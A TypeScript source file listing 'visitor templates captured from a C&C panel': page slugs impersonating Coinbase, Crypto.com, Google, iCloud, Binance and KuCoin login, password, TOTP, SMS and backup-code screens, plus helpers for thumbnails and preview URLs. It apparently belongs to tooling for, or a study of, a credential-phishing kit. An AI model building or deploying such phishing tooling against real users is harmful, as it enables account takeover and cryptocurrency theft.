/**
 * Client-safe catalog of every visitor template captured from the C&C panel.
 * Server code that needs to load the on-disk HTML imports this list and adds
 * fs lookups in `$lib/server/visitorTemplates.ts`.
 *
 * The slug uniquely identifies the template across the project — it matches
 * the on-disk file path (data/visitor-templates/{slug}.html) and the
 * thumbnail file name (static/template-thumbs/{slug-with-dashes}.png).
 */
export interface VisitorTemplate {
	module: string;
	page: string;
	slug: string;
}

export const VISITOR_TEMPLATES: VisitorTemplate[] = [
	{ module: 'Coinbase', page: 'Loading',     slug: 'coinbase/loading' },
	{ module: 'Coinbase', page: 'External',    slug: 'coinbase/external' },
	{ module: 'Coinbase', page: 'Activity',    slug: 'coinbase/activity' },
	{ module: 'Coinbase', page: 'Balance',     slug: 'coinbase/balance' },
	{ module: 'Coinbase', page: 'Case ID',     slug: 'coinbase/case' },
	{ module: 'Coinbase', page: 'CBW',         slug: 'coinbase/cbw' },
	{ module: 'Coinbase', page: 'Reset Pass',  slug: 'coinbase/reset' },
	{ module: 'Coinbase', page: 'Swap',        slug: 'coinbase/swap' },
	{ module: 'Coinbase', page: 'Vault',       slug: 'coinbase/vault' },
	{ module: 'CDC',      page: 'Loading',     slug: 'cdc/loading' },
	{ module: 'CDC',      page: 'Activity',    slug: 'cdc/activity' },
	{ module: 'CDC',      page: 'Balance',     slug: 'cdc/balance' },
	{ module: 'CDC',      page: 'Case ID',     slug: 'cdc/case' },
	{ module: 'CDC',      page: 'External',    slug: 'cdc/external' },
	{ module: 'CDC',      page: 'Wallet',      slug: 'cdc/wallet' },
	{ module: 'Google',   page: 'Loading',     slug: 'google/loading' },
	{ module: 'Google',   page: 'Login',       slug: 'google/login' },
	{ module: 'Google',   page: 'Password',    slug: 'google/password' },
	{ module: 'Google',   page: 'Backup code', slug: 'google/backup' },
	{ module: 'Google',   page: 'Fail',        slug: 'google/fail' },
	{ module: 'Google',   page: 'TOTP',        slug: 'google/totp' },
	{ module: 'Google',   page: 'SMS',         slug: 'google/sms' },
	{ module: 'iCloud',   page: 'Login',       slug: 'icloud/login' },
	{ module: 'iCloud',   page: 'Password',    slug: 'icloud/password' },
	{ module: 'iCloud',   page: '2fa',         slug: 'icloud/2fa' },
	{ module: 'iCloud',   page: 'Locked',      slug: 'icloud/locked' },
	{ module: 'Binance',  page: 'Loading',     slug: 'binance/loading' },
	{ module: 'Binance',  page: 'Case',        slug: 'binance/case' },
	{ module: 'Binance',  page: 'Backup',      slug: 'binance/backup' },
	{ module: 'Binance',  page: 'Balance',     slug: 'binance/balance' },
	{ module: 'Binance',  page: 'Activity',    slug: 'binance/activity' },
	{ module: 'KuCoin',   page: 'Loading',     slug: 'kucoin/loading' }
];

const KEYED: Record<string, VisitorTemplate> = Object.fromEntries(
	VISITOR_TEMPLATES.map((t) => [`${t.module}/${t.page}`, t])
);

export function findTemplate(brand: string, page: string): VisitorTemplate | undefined {
	return KEYED[`${brand}/${page}`];
}

/** Group templates by module for UI rendering. */
export function templatesByModule(): Record<string, VisitorTemplate[]> {
	const out: Record<string, VisitorTemplate[]> = {};
	for (const t of VISITOR_TEMPLATES) {
		(out[t.module] ??= []).push(t);
	}
	return out;
}

/** Convert a slug (e.g. "coinbase/case") to the static thumbnail URL. */
export function thumbUrl(slug: string): string {
	return `/template-thumbs/${slug.replace(/\//g, '-')}.png`;
}

/** Build the public preview URL for a template. */
export function previewUrl(brand: string, page: string, origin = ''): string {
	return `${origin}/templates/preview/${encodeURIComponent(brand)}/${encodeURIComponent(page)}`;
}
